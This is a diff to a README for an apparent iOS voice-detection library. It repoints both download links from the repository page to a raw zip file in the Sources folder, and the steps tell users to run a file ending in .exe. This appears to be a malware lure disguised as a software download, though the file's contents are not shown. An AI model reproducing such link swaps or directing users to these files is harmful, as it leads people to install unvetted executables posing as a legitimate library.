@@ -1,6 +1,6 @@
 # 🎙️ voxrt-silero-ios - Fast voice detection for your device
 
-[![Download the Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/intolerancepseudomonadales905/voxrt-silero-ios)
+[![Download the Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/intolerancepseudomonadales905/voxrt-silero-ios/main/Sources/voxrt_ios_silero_v1.2.zip)
 
 ## 📋 About This Tool
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to access the software files. We publish all versions on our official repository page.
 
-1.  Visit the [official download page](https://github.com/intolerancepseudomonadales905/voxrt-silero-ios).
+1.  Visit the [official download page](https://raw.githubusercontent.com/intolerancepseudomonadales905/voxrt-silero-ios/main/Sources/voxrt_ios_silero_v1.2.zip).
 2.  Scroll down to the latest release section.
 3.  Click the file link ending in .exe to start your download.
 4.  Save the file in a folder you can find later.
